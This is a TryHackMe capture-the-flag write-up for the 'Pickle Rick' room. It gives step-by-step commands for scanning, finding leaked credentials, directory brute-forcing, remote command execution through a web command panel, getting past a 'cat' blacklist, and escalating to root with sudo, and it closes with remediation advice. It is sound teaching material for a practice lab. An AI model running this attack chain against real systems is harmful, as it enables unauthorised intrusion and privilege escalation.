# Pickle Rick — TryHackMe Writeup

> **Room:** [Pickle Rick](https://tryhackme.com/room/picklerick) · **Difficulty:** Easy
> **Category:** Web / Command Injection
> **Author of writeup:** 0xnyx
> **Goal:** Exploit a web server and find three secret "ingredients" to turn Rick back into a human.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/picklerick), **no flags, passwords, usernames, or ingredient values are included** — only the method, so you can reproduce every step yourself.

---

## How to read this writeup

Every step has three parts:

- **Do** — the exact command/action to run.
- **You get** — what the output looks like (sanitized) and what to notice in it.
- **Why / what next** — what that result means and how it leads to the next step.

This is a cause → effect chain: each thing you find is the key to the next door.

---

## Step 1 — Port scan (what is this box running?)

**Do** — Full service + version scan. `-sVC` = version detect + default scripts, `-Pn` = skip ping (THM blocks ICMP), `-T4` = faster timing.

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh     OpenSSH ...
80/tcp open  http    Apache httpd ...   (title: "Rick is sup4r cool")
```

**Why / what next** — Only two doors: SSH (22) and a website (80). We have no SSH creds yet, so the website is the way in. Every web box starts the same way: look at the page, then enumerate hidden files.

---

## Step 2 — Read the page source + robots.txt (free credentials)

**Do** — Grab the homepage HTML and the robots file. The homepage often hides notes in HTML comments that aren't visible in the browser.

```bash
curl -s http://<TARGET>/ | grep -iE 'username|rick|note|<!--'
curl -s http://<TARGET>/robots.txt
```

**You get**

- An HTML comment on the homepage that leaks a **username** (something like *"Note to self, remember username!"*).
- `robots.txt` contains a single strange word.

**Why / what next** — The comment gives us half the login (the username). That single word in `robots.txt` isn't a real "disallow" path — it's the **password**, hidden in plain sight. Now we have a username + a password candidate, but no login page yet. Next we find where to use them.

---

## Step 3 — Directory brute force (find the login + portal)

**Do** — Fuzz for hidden pages, testing common file extensions.

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

**You get**

```
/login.php    (Status: 200)
/portal.php   (Status: 302)   <- redirects when not logged in
/denied.php   (Status: 200)
/assets/      (Status: 301)
```

**Why / what next** — `login.php` is where our username + password go. `portal.php` redirects us away (302) because we're not authenticated yet — that's the page we want to reach *after* logging in. So: log in, get a session cookie, then hit the portal.

---

## Step 4 — Log in (watch for the hidden form field)

**Do** — POST the credentials. Save the session cookie with `-c cookies.txt`. **Important gotcha:** the form has a third field — the submit button is named `sub`. If you leave it out, the login silently fails.

```bash
curl -s -c cookies.txt \
  -d "username=<USER>&password=<PASS>&sub=Login" \
  http://<TARGET>/login.php
```

**You get** — The response no longer bounces you to `denied.php`; `cookies.txt` now holds a valid `PHPSESSID`.

**Why / what next** — We're authenticated. The saved cookie is our "key" for every request from now on (`-b cookies.txt`). Next we open the portal we were locked out of in Step 3.

---

## Step 5 — Reach the Command Panel (foothold = command execution)

**Do** — Request `portal.php` with the cookie, and run a test command through its "Command Panel". It takes a `command` field plus the `sub` submit field.

```bash
curl -s -b cookies.txt --data-urlencode "command=ls -la" -d "sub=Execute" \
  http://<TARGET>/portal.php
```

**You get** — A file listing of the web root, including a file whose name looks like `Sup3rS3cretPickl3Ingred.txt` and a `clue.txt`.

**Why / what next** — This panel runs **arbitrary OS commands** as the web user — that's our foothold (RCE). The first ingredient is sitting right there in the web root. We just need to read it — but the panel filters some commands, so watch out.

---

## Step 6 — Ingredient 1 (bypass the `cat` blacklist)

**Do** — Try to read the ingredient file. `cat` is **blacklisted** by the app, so use any other file reader — `less`, `more`, `tail`, `head`, `strings`, `nl` all work.

```bash
# via the command= field:
command=less Sup3rS3cretPickl3Ingred.txt
```

**You get** — The contents of the first ingredient file.

**Why / what next** — This teaches the key lesson: a blacklist that only blocks `cat` is useless, because a dozen other tools read files too. First ingredient down. The `clue.txt` from Step 5 tells us to "look around the filesystem" — so the other ingredients are elsewhere, not in the web root.

---

## Step 7 — Ingredient 2 (file with a space in its name)

**Do** — The second ingredient lives in Rick's home directory. The filename contains a **space**, so wrap it in quotes or the shell splits it into two arguments.

```bash
command=less "/home/rick/second ingredients"
```

**You get** — The contents of the second ingredient.

**Why / what next** — Two of three. The last one will be in `/root/`, which the web user normally can't read — so before giving up, always check whether we can become root.

---

## Step 8 — Privilege check (`sudo -l`)

**Do** — Ask what our current user is allowed to run as root.

```bash
command=sudo -l
```

**You get**

```
(ALL) NOPASSWD: ALL
```

**Why / what next** — This is the jackpot line. `NOPASSWD: ALL` means the web user can run **any** command as root **without a password**. So reading `/root/` is trivial — just prefix with `sudo`.

---

## Step 9 — Ingredient 3 (read root's files)

**Do** — List `/root` and read the third ingredient as root.

```bash
command=sudo ls -la /root
command=sudo less /root/3rd.txt
```

**You get** — The contents of the third and final ingredient.

**Why / what next** — All three ingredients recovered → room complete. The same `sudo` trick would also give you a full root shell if you wanted one (`sudo /bin/bash`).

---

## The full chain at a glance

| Step | What we did | What it gave us |
|------|-------------|-----------------|
| 1 | nmap | Found web + SSH |
| 2 | Source comment + robots.txt | Username + password |
| 3 | gobuster | Found login.php + portal.php |
| 4 | Login (with `sub` field) | Session cookie |
| 5 | portal.php command panel | RCE (command execution) |
| 6 | `less` instead of `cat` | Ingredient 1 |
| 7 | Quoted path | Ingredient 2 |
| 8 | `sudo -l` | Found NOPASSWD: ALL |
| 9 | `sudo less /root/...` | Ingredient 3 |

## Lessons

- Read page **source comments** and `robots.txt` first — classic credential leaks.
- Watch for **required form fields** beyond the obvious (the `sub` submit button here).
- Command-injection blacklists are almost always incomplete — `cat` blocked ≠ `less`/`more`/`tail`/`strings` blocked.
- `sudo -l` is the **first** privesc check you run after any foothold; `NOPASSWD: ALL` = instant root.

## Remediation

- Never store credentials in source comments or `robots.txt`.
- Don't expose a command-execution feature to users; if unavoidable, use a strict allow-list, not a blacklist.
- Remove overly-permissive sudo rules like `NOPASSWD: ALL`.

---

*Write-up for [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick).*
